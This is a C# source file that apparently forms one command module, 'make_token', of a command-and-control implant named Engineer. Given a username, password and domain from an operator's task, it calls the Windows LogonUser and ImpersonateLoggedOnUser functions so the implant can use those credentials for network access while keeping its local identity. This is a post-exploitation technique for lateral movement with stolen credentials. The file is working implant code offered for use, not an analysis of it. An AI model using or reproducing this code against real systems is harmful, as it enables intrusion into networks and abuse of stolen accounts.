using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Engineer.Models;
using Engineer.Extra;
using Engineer.Functions;

namespace Engineer.Commands
{
    internal class Make_Token : EngineerCommand
    {
        public override string Name => "make_token";

        public override async Task Execute(EngineerTask task)
        {
            if (task.Arguments.TryGetValue("/username", out string username))
            {
                username = username.TrimStart(' ');
                //Console.WriteLine(username);
            }
            if (task.Arguments.TryGetValue("/password", out string password))
            {
                password = password.TrimStart(' ');
                //Console.WriteLine(password);
            }
            if (task.Arguments.TryGetValue("/domain", out string domain))
            {
                domain = domain.TrimStart(' ');
                //Console.WriteLine(domain);
            }

            if (WinAPIs.Advapi.LogonUser(username, domain, password, WinAPIs.Advapi.LogonType.LOGON32_LOGON_NEW_CREDENTIALS, WinAPIs.Advapi.LogonUserProvider.LOGON32_PROVIDER_DEFAULT, out IntPtr hToken))
            {
                if (WinAPIs.Advapi.ImpersonateLoggedOnUser(hToken))
                {
                    WindowsIdentity identity = new WindowsIdentity(hToken);
                    try
                    {
                        identity.Impersonate();
                        Program.ImpersonatedUser = identity;
                        Program.ImpersonatedUserChanged = true;
                        Tasking.FillTaskResults($"Successfully impersonated {domain}\\{username} for remote access, still {identity.Name} locally",task,EngTaskStatus.Complete,TaskResponseType.String);
                        return;
                    }
                    catch (Exception ex)
                    {
                        //Console.WriteLine(ex.Message);
                       // Console.WriteLine(ex.StackTrace);
                        Tasking.FillTaskResults(ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
                        return;
                    }

                }
                Tasking.FillTaskResults("error: " + "created token but Failed to imersonate user",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                return;
            }
            Tasking.FillTaskResults("error: " + "Failed to make token",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
        }
    }
}
